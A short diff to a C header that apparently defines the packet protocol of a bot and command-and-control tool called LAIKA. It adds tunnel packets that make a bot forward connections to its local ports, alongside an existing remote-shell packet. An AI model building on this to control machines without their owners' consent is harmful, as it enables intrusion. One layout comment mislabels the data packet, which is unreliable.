@@ -53,6 +53,30 @@ enum {
     /* layout of LAIKAPKT_HANDSHAKE_RES:
     *   uint8_t cncEndian;
     */
+    LAIKAPKT_TUNNEL_OPEN, /* if sent to bot, opens a tunnel to localhost's port. if sent to cnc, signifies you opened the tunnel */
+    /* layout of LAIKAPKT_TUNNEL_OPEN:
+    *   uint16_t port;
+    */
+    LAIKAPKT_TUNNEL_CLOSE, /* if sent to bot, closes a tunnel to localhost's port. if sent to cnc, signifies you closed the tunnel */
+    /* layout of LAIKAPKT_TUNNEL_CLOSE:
+    *   uint16_t port;
+    */
+    LAIKAPKT_TUNNEL_CONNECTION_ADD,
+    /* layout of LAIKAPKT_TUNNEL_CONNECTION_ADD:
+    *   uint16_t port;
+    *   uint16_t id;
+    */
+    LAIKAPKT_TUNNEL_CONNECTION_RMV,
+    /* layout of LAIKAPKT_TUNNEL_CONNECTION_RMV:
+    *   uint16_t port;
+    *   uint16_t id;
+    */
+    LAIKAPKT_TUNNEL_CONNECTION_DATA,
+    /* layout of LAIKAPKT_TUNNEL_CONNECTION_RMV:
+    *   uint16_t port;
+    *   uint16_t id;
+    *   uint8_t data[VAR_PACKET_LENGTH-4]; -- '-4' for the port & id
+    */
     LAIKAPKT_SHELL_OPEN, /* if sent to bot, opens a shell. if sent to cnc, signifies you opened a shell */
     /* layout of LAIKAPKT_SHELL_OPEN:
     *   uint16_t cols;
